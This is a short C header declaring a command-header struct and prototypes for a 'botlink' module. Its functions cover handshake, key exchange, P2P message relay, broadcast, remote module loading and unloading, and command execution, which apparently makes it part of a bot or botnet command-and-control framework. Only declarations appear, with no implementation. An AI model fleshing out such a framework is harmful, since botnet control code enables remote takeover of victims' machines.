typedef struct CmdHdr {
    unsigned char cmd;
    unsigned short size;
} CMDHdr;


int botlink_init(Modules **);
int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_write(Modules *mptr, Connection *cptr, char **buf, int *size);
int botlink_read(Modules *mptr, Connection *cptr, char **buf, int *size);
int botlink_incoming(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_outgoing(Modules *mptr, Connection *cptr, char **buf, int *size);
int botlink_connect(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_disconnect(Modules *mptr, Connection *cptr, char *buf, int size);

int botlink_handshake(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_keyexchange(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_message_exec(Modules *mptr, Connection *cptr, char *buf, int size, bool from_p2p);
int botlink_message(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_broadcast(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_ping(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_pingpong(Modules *mptr, Connection *cptr, int pong);
int botlink_cmd_loadmodule(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_unloadmodule(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_execute(Modules *mptr, Connection *cptr, char *buf, int size);
int botlink_cmd_control_module(Modules *mptr, Connection *cptr, char *buf, int size);

